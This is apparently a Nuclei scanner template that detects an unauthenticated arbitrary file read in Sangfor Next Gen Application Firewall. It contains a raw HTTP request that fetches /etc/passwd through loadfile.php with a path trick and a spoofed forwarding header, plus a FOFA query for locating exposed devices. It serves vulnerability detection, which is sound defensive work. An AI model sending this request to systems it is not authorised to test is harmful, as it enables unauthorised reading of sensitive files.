http:
- matchers:
  - part: body
    regex:
    - root:[x*]:0:0
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - filename="passwd"
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1

    Host: {{Hostname}}

    y-forwarded-for: 127.0.0.1

    '
id: sangfor-nextgen-lfi
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:sangfor:next-gen_application_firewall:*:*:*:*:*:*:*:*
  description: 'Sangfor Next Gen Application Firewall is susceptible to Local File
    Inclusion as it does not validate the file parameter.

    '
  metadata:
    fofa-query: title="SANGFOR | NGAF"
    max-request: 1
    product: next-gen_application_firewall
    vendor: sangfor
    verified: true
  name: Sangfor Next Gen Application Firewall - Arbitary File Read
  reference:
  - https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
  severity: high
  tags: sangfor,lfi,vuln
